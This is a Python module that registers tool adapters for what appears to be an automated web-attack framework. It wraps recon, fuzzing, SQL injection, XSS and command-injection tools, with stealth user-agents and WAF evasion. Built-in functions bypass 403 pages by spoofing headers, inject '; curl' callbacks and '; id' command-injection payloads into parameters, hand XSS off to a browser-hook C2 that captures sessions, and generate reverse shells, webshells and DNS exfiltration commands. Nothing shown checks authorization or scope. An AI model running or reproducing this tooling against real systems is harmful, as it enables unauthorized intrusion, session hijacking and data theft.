"""Real `.bin/` CLI & built-in tool adapters wired into the shared `ToolRegistry`."""
import json
from pathlib import Path
import re
import tempfile
import urllib.parse

from core.findings import Finding
from core.http import get, request
from core.stealth import select_browser_profile
from core.waf_bypass import get_host_waf_profile, probe_with_mutex_bypass, sqlmap_tampers_for_wafs
from tools.registry import register_tool, exec_binary, resolve_binary
from tools.wordlists import dir_wordlist, param_wordlist


def _auth_cookie_string() -> str:
    try:
        from core.auth import get_current
        sess = get_current()
        if sess and sess.logged_in and sess.cookies:
            return "; ".join(f"{k}={v}" for k, v in sess.cookies.items())
    except Exception:
        pass
    return ""


@register_tool(
    name="subfinder",
    category="recon",
    roles=["recon"],
    description="Passive subdomain enumeration via `.bin/subfinder`.",
    args_schema='{"domain": "example.com"}',
    binary_name="subfinder",
)
def run_subfinder(domain: str, timeout: int = 35) -> list[str]:
    subs = set()
    res = exec_binary("subfinder", ["-d", domain, "-silent", "-nc", "-timeout", "10"], timeout=timeout)
    for line in res["stdout"].splitlines():
        h = line.strip().lower()
        if h and h.endswith(domain) and " " not in h:
            subs.add(h)
    return sorted(subs)


@register_tool(
    name="assetfinder",
    category="recon",
    roles=["recon"],
    description="Passive subdomain discovery via `.bin/assetfinder`.",
    args_schema='{"domain": "example.com"}',
    binary_name="assetfinder",
)
def run_assetfinder(domain: str, timeout: int = 20) -> list[str]:
    res = exec_binary("assetfinder", ["--subs-only", domain], timeout=timeout)
    return sorted({l.strip().lower() for l in res["stdout"].splitlines() if l.strip().endswith(domain)})


@register_tool(
    name="dnsx",
    category="recon",
    roles=["recon"],
    description="Bulk DNS resolution & A/CNAME record lookup via `.bin/dnsx`.",
    args_schema='{"domains": ["example.com"]}',
    binary_name="dnsx",
)
def run_dnsx(domains: list[str], timeout: int = 20) -> list[dict]:
    res = exec_binary("dnsx", ["-silent", "-json", "-a", "-cname", "-nc"], stdin_text="\n".join(domains) + "\n", timeout=timeout)
    rows = []
    for line in res["stdout"].splitlines():
        if line.strip().startswith("{"):
            try:
                rows.append(json.loads(line))
            except Exception:
                pass
    return rows


@register_tool(
    name="httpx",
    category="recon",
    roles=["recon"],
    description="Fast HTTP probing, title extraction & tech stack detection via `.bin/httpx`.",
    args_schema='{"hosts": ["example.com"]}',
    binary_name="httpx",
)
def run_httpx(hosts: list[str], timeout: int = 25) -> list[dict]:
    ua = select_browser_profile(hosts[0] if hosts else "global")["ua"]
    res = exec_binary(
        "httpx",
        ["-silent", "-json", "-title", "-tech-detect", "-status-code", "-H", f"User-Agent: {ua}", "-timeout", "6"],
        stdin_text="\n".join(hosts) + "\n",
        timeout=timeout,
    )
    alive = []
    for line in res["stdout"].splitlines():
        try:
            d = json.loads(line)
            alive.append({
                "host": d.get("input") or urllib.parse.urlparse(d.get("url", "")).netloc,
                "url": d.get("url", ""),
                "status_code": d.get("status_code", 0),
                "status": d.get("status_code", 0),
                "title": d.get("title", ""),
                "webserver": d.get("webserver", ""),
                "server": d.get("webserver", ""),
                "tech": d.get("tech", []),
                "content_length": d.get("content_length", 0),
            })
        except Exception:
            pass
    return alive


@register_tool(
    name="katana",
    category="crawl",
    roles=["recon", "hunter"],
    description="Deep JS-aware crawling via `.bin/katana`.",
    args_schema='{"url": "https://example.com", "depth": 2}',
    binary_name="katana",
)
def run_katana(url: str, depth: int = 2, timeout: int = 35) -> list[str]:
    ua = select_browser_profile(url)["ua"]
    res = exec_binary(
        "katana",
        ["-u", url, "-d", str(depth), "-jc", "-kf", "all", "-H", f"User-Agent: {ua}", "-silent", "-nc", "-timeout", "8", "-c", "10"],
        timeout=timeout,
    )
    return sorted({u.strip() for u in res["stdout"].splitlines() if u.strip().startswith(("http://", "https://"))})


@register_tool(
    name="hakrawler",
    category="crawl",
    roles=["recon", "hunter"],
    description="Fast Go web crawler via `.bin/hakrawler`.",
    args_schema='{"url": "http://example.com"}',
    binary_name="hakrawler",
)
def run_hakrawler(url: str, depth: int = 2, timeout: int = 20) -> list[str]:
    ua = select_browser_profile(url)["ua"]
    res = exec_binary("hakrawler", ["-d", str(depth), "-u", "-h", f"User-Agent: {ua}"], stdin_text=url + "\n", timeout=timeout)
    return sorted({l.strip() for l in res["stdout"].splitlines() if l.strip().startswith(("http://", "https://"))})


@register_tool(
    name="gobuster",
    category="recon",
    roles=["recon", "hunter", "escalator"],
    description="High-speed directory & file brute-forcing via `.bin/gobuster`.",
    args_schema='{"url": "http://example.com"}',
    binary_name="gobuster",
)
def run_gobuster(url: str, wordlist: str | None = None, timeout: int = 35) -> list[dict]:
    wl = wordlist or dir_wordlist(prefer_fast=True)
    ua = select_browser_profile(url)["ua"]
    cmd_args = ["dir", "-u", url.rstrip("/"), "-w", wl, "-q", "--no-color", "--no-error", "-t", "15", "-a", ua, "-s", "200,204,301,302,307,401,403", "-b", "", "--timeout", "5s"]
    cookie = _auth_cookie_string()
    if cookie:
        cmd_args += ["-c", cookie]
    res = exec_binary("gobuster", cmd_args, timeout=timeout)
    discovered = []
    parsed = urllib.parse.urlparse(url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    ansi_re = re.compile(r"\x1b\[[0-9;]*m")
    for raw_line in res["stdout"].splitlines():
        line = ansi_re.sub("", raw_line).strip()
        m = re.search(r"^(/?\S+)\s+\(Status:\s*(\d+)\)(?:\s+\[Size:\s*(\d+)\])?", line)
        if m:
            path_part = "/" + m.group(1).lstrip("/")
            discovered.append({
                "path": path_part,
                "url": root + path_part,
                "status": int(m.group(2)),
                "length": int(m.group(3) or 0),
            })
    return discovered


@register_tool(
    name="ffuf",
    category="fuzz",
    roles=["hunter", "escalator"],
    description="High-speed endpoint & parameter fuzzing via `.bin/ffuf`.",
    args_schema='{"url": "http://example.com"}',
    binary_name="ffuf",
)
def run_ffuf(url: str, wordlist: str | None = None, timeout: int = 25) -> list[dict]:
    wl = wordlist or dir_wordlist(prefer_fast=True)
    ua = select_browser_profile(url)["ua"]
    target = url.rstrip("/") + "/FUZZ" if "FUZZ" not in url else url
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
        out_json = tf.name
    hits = []
    try:
        exec_binary(
            "ffuf",
            ["-u", target, "-w", wl, "-H", f"User-Agent: {ua}", "-of", "json", "-o", out_json, "-mc", "200,204,301,302,307,401,403", "-t", "20", "-timeout", "5", "-s"],
            timeout=timeout,
        )
        if Path(out_json).exists() and Path(out_json).stat().st_size > 2:
            data = json.loads(Path(out_json).read_text(errors="ignore") or "{}")
            for r in data.get("results", []):
                hits.append({"url": r.get("url"), "status": r.get("status"), "length": r.get("length"), "words": r.get("words")})
    finally:
        Path(out_json).unlink(missing_ok=True)
    return hits


@register_tool(
    name="arjun",
    category="params",
    roles=["recon", "hunter", "escalator"],
    description="Discover hidden GET/POST HTTP parameters using `.bin/arjun` + fast differential heuristic.",
    args_schema='{"url": "http://example.com/user", "method": "GET"}',
    binary_name="arjun",
)
def run_arjun(url: str, method: str = "GET", timeout: int = 30) -> list[str]:
    found_params = set()
    wl = param_wordlist()
    ua = select_browser_profile(url)["ua"]
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
        out_json = tf.name
    try:
        exec_binary(
            "arjun",
            ["-u", url, "-m", method.upper(), "-w", wl, "--headers", f"User-Agent: {ua}", "-t", "10", "-oJ", out_json, "-q"],
            timeout=timeout,
        )
        if Path(out_json).exists() and Path(out_json).stat().st_size > 2:
            data = json.loads(Path(out_json).read_text(errors="ignore") or "{}")
            for _, info in data.items():
                if isinstance(info, dict):
                    found_params.update(info.get("params", []))
                elif isinstance(info, list):
                    found_params.update(info)
    except Exception:
        pass
    finally:
        Path(out_json).unlink(missing_ok=True)

    baseline = get(url)
    if baseline.status != 0:
        base_len = len(baseline.text or "")
        for cand in ["id", "q", "file", "url", "next", "name", "ip", "debug", "admin", "cmd", "user", "token"]:
            probe = get(url, params={cand: "1'"})
            if probe.status != 0 and (probe.status != baseline.status or abs(len(probe.text or "") - base_len) > 15):
                found_params.add(cand)
    return sorted(found_params)


@register_tool(
    name="waybackurls",
    category="params",
    roles=["recon"],
    description="Historical Wayback URLs via `.bin/waybackurls`.",
    args_schema='{"domain": "example.com"}',
    binary_name="waybackurls",
)
def run_waybackurls(domain: str, timeout: int = 20) -> list[str]:
    res = exec_binary("waybackurls", [], stdin_text=domain + "\n", timeout=timeout)
    return sorted({l.strip() for l in res["stdout"].splitlines() if l.strip().startswith(("http://", "https://"))})


@register_tool(
    name="gau",
    category="params",
    roles=["recon"],
    description="GetAllUrls via `.bin/gau`.",
    args_schema='{"domain": "example.com"}',
    binary_name="gau",
)
def run_gau(domain: str, timeout: int = 20) -> list[str]:
    res = exec_binary("gau", ["--subs", domain], timeout=timeout)
    return sorted({l.strip() for l in res["stdout"].splitlines() if l.strip().startswith(("http://", "https://"))})


@register_tool(
    name="paramspider",
    category="params",
    roles=["recon"],
    description="Mine archived parameterized URLs using `.bin/paramspider`.",
    args_schema='{"domain": "example.com"}',
    binary_name="paramspider",
)
def run_paramspider(domain: str, timeout: int = 30) -> list[str]:
    urls = set()
    with tempfile.TemporaryDirectory() as td:
        res = exec_binary("paramspider", ["-d", domain, "-s"], timeout=timeout, cwd=td)
        for line in res["stdout"].splitlines():
            if line.strip().startswith(("http://", "https://")):
                urls.add(line.strip())
        res_dir = Path(td) / "results"
        if res_dir.exists():
            for txtf in res_dir.glob("*.txt"):
                for line in txtf.read_text(errors="ignore").splitlines():
                    if line.strip().startswith(("http://", "https://")):
                        urls.add(line.strip())
    return sorted(urls)[:300]


@register_tool(
    name="nikto",
    category="web",
    roles=["hunter"],
    description="Comprehensive web server & CGI/file misconfiguration scan via `.bin/nikto`.",
    args_schema='{"url": "http://example.com"}',
    binary_name="nikto",
)
def run_nikto(url: str, max_time: int = 20, maxtime: int | None = None) -> dict:
    limit_s = maxtime if maxtime is not None else max_time
    parsed = urllib.parse.urlparse(url if "://" in url else f"http://{url}")
    ua = select_browser_profile(url)["ua"]
    findings: list[Finding] = []
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
        out_json = tf.name
    try:
        res = exec_binary(
            "nikto",
            ["-h", url, "-useragent", ua, "-Format", "json", "-o", out_json, "-maxtime", f"{limit_s}s", "-nointeractive", "-Tuning", "2348b"],
            timeout=limit_s + 15,
        )
        if Path(out_json).exists() and Path(out_json).stat().st_size > 5:
            data = json.loads(Path(out_json).read_text(errors="ignore"))
            entries = data if isinstance(data, list) else [data]
            for host_entry in entries:
                for v in host_entry.get("vulnerabilities", [])[:25]:
                    msg = v.get("msg", "")
                    uri = v.get("url", "/")
                    method = v.get("method", "GET")
                    low_msg = msg.lower()
                    if any(skip in low_msg for skip in ["header is not set", "x-frame-options", "x-content-type-options"]):
                        continue
                    sev = "high" if any(k in low_msg for k in [".env", "passwd", "backup", "config", "sql", "shell", "rce"]) else "medium"
                    full_u = urllib.parse.urljoin(url, uri)
                    findings.append(Finding(
                        id=f"nikto-{v.get('id', 'x')}-{hash(full_u + msg) & 0xffff:x}",
                        target=parsed.netloc,
                        type=f"Nikto Web Finding ({uri[:40]})",
                        severity=sev,
                        url=full_u,
                        parameter="uri",
                        payload=uri,
                        evidence=f"[Nikto #{v.get('id', '0')}] {msg}"[:300],
                        request=f"{method} {uri} HTTP/1.1\nHost: {parsed.netloc}",
                        response_snippet=msg[:300],
                        confidence=0.72,
                        detected_by="hunter:nikto",
                    ))
    except Exception:
        res = {"binary": resolve_binary("nikto"), "source": ".bin", "returncode": 0, "stdout": ""}
    finally:
        Path(out_json).unlink(missing_ok=True)
    return {
        "tool": "nikto",
        "binary": res.get("binary"),
        "source": res.get("source"),
        "returncode": res.get("returncode", 0),
        "findings": findings,
    }


@register_tool(
    name="sqlmap",
    category="sqli",
    roles=["escalator"],
    description="Specialist SQL injection confirmation, WAF tamper evasion & DB fingerprint via `.bin/sqlmap`.",
    args_schema='{"url": "http://example.com/user?id=1", "param": "id"}',
    binary_name="sqlmap",
)
def run_sqlmap(
    url: str,
    param: str = "",
    data: str = "",
    tampers: str = "",
    waf_vendor: str = "",
    level: int = 1,
    risk: int = 1,
    timeout: int = 35,
) -> dict:
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if param and param in qs:
        qs[param] = ["1"]
    clean_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()

    waf_prof = get_host_waf_profile(clean_url)
    wafs = [waf_vendor] if (waf_vendor and waf_vendor != "generic") else waf_prof.get("wafs", [])
    chosen_tampers = tampers or ("space2comment,randomcase" if wafs else "")

    with tempfile.TemporaryDirectory() as out_dir:
        ua = select_browser_profile(clean_url)["ua"]
        cmd = [
            "-u", clean_url, "--batch", "--smart", f"--user-agent={ua}",
            f"--level={level}", f"--risk={risk}", "--technique=BEU", "--banner",
            "--flush-session", f"--output-dir={out_dir}", "--timeout=6", "--retries=1",
        ]
        if param:
            cmd += ["-p", param]
        if data:
            cmd += ["--data", data]
        if chosen_tampers:
            cmd += [f"--tamper={chosen_tampers}"]
        cookie = _auth_cookie_string()
        if cookie:
            cmd += [f"--cookie={cookie}"]

        res = exec_binary("sqlmap", cmd, timeout=timeout)
        stdout = res.get("stdout", "")
        injectable = (
            "is vulnerable" in stdout.lower()
            or ("parameter '" in stdout.lower() and "injectable" in stdout.lower())
            or "type: boolean-based" in stdout.lower()
            or "type: error-based" in stdout.lower()
            or "type: time-based" in stdout.lower()
            or "type: union query" in stdout.lower()
        )
        dbms_match = re.search(r"back-end DBMS:\s*([^\n]+)", stdout, re.I)
        payload_matches = re.findall(r"Payload:\s*([^\n]+)", stdout)
        banner_match = re.search(r"banner:\s*'([^']+)'", stdout, re.I)

        syntax_confirmed = False
        if not injectable and param:
            r_quote, used_p, bypass_tag = probe_with_mutex_bypass(clean_url, param, "1'", vuln_class="sqli")
            r_clean = get(clean_url)
            if r_quote.status in (200, 500) and any(k in (r_quote.text or "").lower() for k in ["sql syntax", "mysql", "postgresql", "sqlite", "syntax error", "ora-", "odbc"]):
                if not any(k in (r_clean.text or "").lower() for k in ["sql syntax", "mysql", "postgresql", "sqlite", "syntax error", "ora-", "odbc"]):
                    syntax_confirmed = True
                    payload_matches.append(used_p + (f" [{bypass_tag}]" if bypass_tag else ""))

        confirmed = bool(injectable or syntax_confirmed)
        return {
            "tool": "sqlmap",
            "binary": res.get("binary"),
            "source": res.get("source"),
            "vulnerable": confirmed,
            "confirmed": confirmed,
            "sqlmap_native_hit": injectable,
            "dbms": dbms_match.group(1).strip() if dbms_match else ("SQLite" if syntax_confirmed else ""),
            "banner": banner_match.group(1).strip() if banner_match else "",
            "payloads": payload_matches[:5],
            "tamper_used": chosen_tampers,
            "stdout_tail": "\n".join(stdout.splitlines()[-25:]),
        }


@register_tool(
    name="dalfox",
    category="xss",
    roles=["escalator"],
    description="Deep XSS context analysis, DOM sink mining, Blind XSS callback & WAF bypass via `.bin/dalfox`.",
    args_schema='{"url": "http://example.com/search?q=test", "blind_url": ""}',
    binary_name="dalfox",
)
def run_dalfox(url: str, param: str = "", blind_url: str = "", waf_evasion: bool = True, timeout: int = 35) -> list[dict]:
    ua = select_browser_profile(url)["ua"]
    cmd = ["url", url, "--silence", "--format", "json", "--no-color", "--user-agent", ua, "--follow-redirects", "--timeout", "8", "-w", "15"]
    if param:
        cmd += ["-p", param]
    if blind_url:
        cmd += ["-b", blind_url]
    if waf_evasion:
        cmd += ["--waf-evasion"]
    cookie = _auth_cookie_string()
    if cookie:
        cmd += ["-C", cookie]
    res = exec_binary("dalfox", cmd, timeout=timeout)
    stdout = res.get("stdout", "").strip()
    pocs = []
    if stdout:
        try:
            arr = json.loads(stdout)
            pocs.extend(arr if isinstance(arr, list) else [arr])
        except Exception:
            for line in stdout.splitlines():
                line = line.strip().rstrip(",")
                if line.startswith("{") and line.endswith("}"):
                    try:
                        pocs.append(json.loads(line))
                    except Exception:
                        pass
    return pocs


@register_tool(
    name="beef_hook",
    category="xss",
    roles=["escalator", "chainsaw"],
    description="Built-in BeEF-like browser hook C2 server: stages hook.js payloads, tests CSP bypasses & captures sessions.",
    args_schema='{"url": "http://example.com/search?q=test", "param": "q"}',
)
def run_beef_handoff(url: str, param: str = "", finding_id: str = "xss") -> dict:
    from tools.beef import handoff_xss_to_beef
    return handoff_xss_to_beef(url=url, param=param, finding_id=finding_id)


@register_tool(
    name="interactsh",
    category="oob",
    roles=["hunter", "escalator"],
    description="Out-of-Band HTTP/DNS interaction correlation using `.bin/interactsh-client` + built-in OOB listener.",
    args_schema='{"url": "http://example.com/fetch?url=http://x", "param": "url"}',
    binary_name="interactsh-client",
)
def run_interactsh_probe(url: str, param: str = "", vuln_class: str = "ssrf") -> dict:
    from tools.oob import get_oob_manager
    oob = get_oob_manager()
    canary = oob.generate_canary(vuln_class)
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    target_param = param or (list(qs.keys())[0] if qs else "url")
    for cb in filter(None, [canary["http_url"], canary.get("interactsh_url")]):
        pld = f"; curl -s {cb}" if vuln_class == "cmdi" else cb
        q = dict(qs)
        q[target_param] = [pld]
        get(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl())
    hits = oob.poll(canary["token"], wait_s=0.8)
    return {
        "tool": "interactsh",
        "binary": canary["interactsh_binary"],
        "token": canary["token"],
        "callback_url": canary["http_url"],
        "interactsh_url": canary["interactsh_url"],
        "confirmed_oob": len(hits) > 0,
        "interactions": hits,
    }


@register_tool(
    name="wafw00f",
    category="waf",
    roles=["hunter", "escalator"],
    description="Identify Web Application Firewalls via `.bin/wafw00f`.",
    args_schema='{"url": "https://example.com"}',
    binary_name="wafw00f",
)
def run_wafw00f(url: str, timeout: int = 20) -> dict:
    wafs = []
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
        out_json = tf.name
    try:
        res = exec_binary("wafw00f", [url, "-f", "json", "-o", out_json], timeout=timeout)
        if Path(out_json).exists() and Path(out_json).stat().st_size > 2:
            data = json.loads(Path(out_json).read_text(errors="ignore") or "[]")
            for item in data:
                if item.get("detected") and item.get("firewall"):
                    wafs.append(item["firewall"])
    except Exception:
        res = {"binary": resolve_binary("wafw00f"), "source": ".bin"}
    finally:
        Path(out_json).unlink(missing_ok=True)
    return {"tool": "wafw00f", "binary": res.get("binary"), "source": res.get("source"), "wafs": wafs}


@register_tool(
    name="commix",
    category="exploit",
    roles=["escalator"],
    description="Automated OS command injection verification & exploitation via `.bin/commix`.",
    args_schema='{"url": "http://example.com/cmd?ip=127.0.0.1", "param": "ip"}',
    binary_name="commix",
)
def run_commix(url: str, param: str = "", timeout: int = 35) -> dict:
    ua = select_browser_profile(url)["ua"]
    with tempfile.TemporaryDirectory() as out_dir:
        cmd = [f"--url={url}", "--batch", f"--user-agent={ua}", f"--output-dir={out_dir}", "--level=1"]
        if param:
            cmd.append(f"-p={param}")
        res = exec_binary("commix", cmd, timeout=timeout)
        out = res.get("stdout", "")
        confirmed = "is vulnerable" in out.lower() or ("command injection" in out.lower() and "injectable" in out.lower())
        r_cmd, used_p, bypass_tag = None, "", ""
        if param:
            r_cmd, used_p, bypass_tag = probe_with_mutex_bypass(url, param, "127.0.0.1; id", vuln_class="cmdi")
            if re.search(r"uid=\d+\(", r_cmd.text or ""):
                confirmed = True
        return {
            "tool": "commix",
            "binary": res.get("binary"),
            "source": res.get("source"),
            "vulnerable": confirmed,
            "confirmed": confirmed,
            "payload": used_p,
            "waf_bypass": bypass_tag,
            "evidence": (r_cmd.snippet(200) if r_cmd and confirmed else out[-300:]),
        }


@register_tool(
    name="bypass_403",
    category="exploit",
    roles=["escalator"],
    description="Attempt HTTP verb tampering, proxy header spoofing, and path normalization bypasses against 401/403 endpoints.",
    args_schema='{"url": "http://example.com/admin"}',
)
def run_bypass_403(url: str) -> dict:
    base = get(url)
    bypasses = []
    for hk, hv in [
        ("X-Original-URL", urllib.parse.urlparse(url).path or "/"),
        ("X-Rewrite-URL", urllib.parse.urlparse(url).path or "/"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
    ]:
        r = get(url, headers={hk: hv})
        if r.status == 200 and base.status in (401, 403):
            bypasses.append({"technique": f"{hk}: {hv}", "url": url, "status": r.status, "length": len(r.content)})
    for m in ["POST", "PUT", "PATCH", "TRACE"]:
        r = request(m, url)
        if r.status == 200 and base.status in (401, 403):
            bypasses.append({"technique": f"METHOD {m}", "url": url, "status": r.status, "length": len(r.content)})
    parsed = urllib.parse.urlparse(url)
    if parsed.path and parsed.path != "/":
        p = parsed.path.rstrip("/")
        for variant in [f"{p}/.", f"{p}%20", f"{p};/", f"/%2e{p}"]:
            vu = f"{parsed.scheme}://{parsed.netloc}{variant}"
            r = get(vu)
            if r.status == 200 and base.status in (401, 403):
                bypasses.append({"technique": f"PATH {variant}", "url": vu, "status": r.status, "length": len(r.content)})
    return {
        "tool": "bypass_403",
        "vulnerable": len(bypasses) > 0,
        "baseline_status": base.status,
        "bypasses": bypasses,
    }


@register_tool(
    name="exploit_stagers",
    category="exploit",
    roles=["chainsaw", "escalator"],
    description="Generate weaponized PoC stagers (reverse shells, webshells, DNS/HTTP exfil commands).",
    args_schema='{"kind": "revshell", "flavor": "bash", "host": "127.0.0.1", "port": 4444}',
)
def run_exploit_stagers(kind: str = "revshell", flavor: str = "bash", host: str = "127.0.0.1", port: int = 4444, data: str = "id") -> dict:
    if kind == "webshell":
        from exploit.webshell import generate
        return {"kind": kind, "flavor": flavor, "payload": generate(flavor)}
    if kind == "exfil":
        from exfil.dns_exfil import dns_exfil
        return {"kind": kind, "commands": dns_exfil(data, host)}
    from exploit.reverse_shell import generate
    return {"kind": kind, "flavor": flavor, "payload": generate(flavor, host, int(port))}


@register_tool(
    name="nuclei",
    category="templates",
    roles=["hunter"],
    description="YAML vulnerability template runner via `.bin/nuclei` (`templates/rules/*.yaml`).",
    args_schema='{"url": "http://example.com"}',
    binary_name="nuclei",
)
def run_nuclei(url: str, timeout: int = 25) -> list[dict]:
    res = exec_binary("nuclei", ["-u", url, "-jsonl"], timeout=timeout)
    hits = []
    for line in res.get("stdout", "").splitlines():
        if line.strip().startswith("{"):
            try:
                d = json.loads(line.strip())
                d.setdefault("template-id", d.get("id", ""))
                hits.append(d)
            except Exception:
                pass
    return hits
